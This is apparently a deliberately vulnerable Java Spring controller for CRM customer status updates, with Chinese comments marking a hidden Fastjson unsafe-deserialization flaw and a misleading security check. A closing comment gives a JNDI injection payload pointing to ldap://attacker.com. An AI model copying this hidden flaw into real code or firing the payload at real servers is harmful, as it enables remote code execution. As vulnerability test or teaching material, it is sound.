package com.crm.enterprise;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.util.HashMap;
import java.util.Map;

/**
 * CRM客户管理控制器
 * @author enterprise_dev_team
 */
@RestController
@RequestMapping("/api/v1/customers")
public class CrmController {
    private final CustomerService customerService = new CustomerService();

    /**
     * 更新客户信息接口
     * 攻击面示例：/batchSetStatus
     */
    @PostMapping("/batchSetStatus")
    public ResponseDTO batchSetStatus(@RequestBody StatusUpdateRequest request, HttpServletRequest httpServletRequest) {
        try {
            // 从请求头获取上下文配置
            String contextConfig = httpServletRequest.getHeader("X-CRM-Context");
            // 解析并验证客户状态
            boolean status = customerService.parseAndValidateStatus(request.getStatus(), contextConfig);
            // 更新客户状态
            customerService.updateCustomerStatus(request.getCustomerId(), status);
            return new ResponseDTO("Status updated successfully");
        } catch (Exception e) {
            return new ResponseDTO("Error: " + e.getMessage());
        }
    }

    /**
     * 客户状态更新请求
     */
    static class StatusUpdateRequest {
        private Long customerId;
        private String status; // 恶意输入将在此字段注入

        // Getters and setters
        public Long getCustomerId() { return customerId; }
        public void setCustomerId(Long customerId) { this.customerId = customerId; }
        public String getStatus() { return status; }
        public void setStatus(String status) { this.status = status; }
    }

    /**
     * 响应数据传输对象
     */
    static class ResponseDTO {
        private final String message;

        ResponseDTO(String message) { this.message = message; }
        public String getMessage() { return message; }
    }
}

class CustomerService {
    /**
     * 解析并验证客户状态
     * 漏洞隐藏点：多层函数调用链中的反序列化操作
     */
    boolean parseAndValidateStatus(String statusJson, String contextConfig) {
        // 模拟配置解析流程
        Map<String, Object> configMap = parseConfig(contextConfig);
        // 获取反序列化配置
        boolean skipError = isSkipErrorEnabled(configMap);
        // 解析状态配置
        return parseStatusJson(statusJson, skipError);
    }

    /**
     * 解析配置字符串（包含误导性安全检查）
     */
    private Map<String, Object> parseConfig(String configStr) {
        if (configStr == null || configStr.isEmpty()) {
            return new HashMap<>();
        }
        // 误导性安全检查（实际无用）
        if (configStr.length() > 1024) {
            throw new IllegalArgumentException("Config too long");
        }
        // 不安全的反序列化操作
        return JSON.parseObject(configStr, Map.class, Feature.SkipError);
    }

    /**
     * 获取跳过错误配置
     */
    private boolean isSkipErrorEnabled(Map<String, Object> configMap) {
        Object skipErrorObj = configMap.get("skipErrors");
        if (skipErrorObj instanceof Boolean) {
            return (Boolean) skipErrorObj;
        }
        return false;
    }

    /**
     * 解析状态JSON（漏洞实际触发点）
     */
    private boolean parseStatusJson(String statusJson, boolean skipError) {
        if (skipError) {
            // 危险的反序列化配置
            return JSON.parseObject(statusJson, StatusConfig.class, Feature.SkipError).isValid();
        }
        return JSON.parseObject(statusJson, StatusConfig.class).isValid();
    }

    void updateCustomerStatus(Long id, boolean status) {
        // 模拟数据库更新操作
        System.out.println("Updating customer " + id + " status to " + status);
    }
}

class StatusConfig {
    private boolean valid;
    private String configValue;

    // Fastjson反序列化会调用getter/setter
    public boolean isValid() { return valid; }
    public void setValid(boolean valid) { this.valid = valid; }
    public String getConfigValue() { return configValue; }
    public void setConfigValue(String configValue) { this.configValue = configValue; }
}

// 模拟攻击payload:
// {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/exploit","autoCommit":true}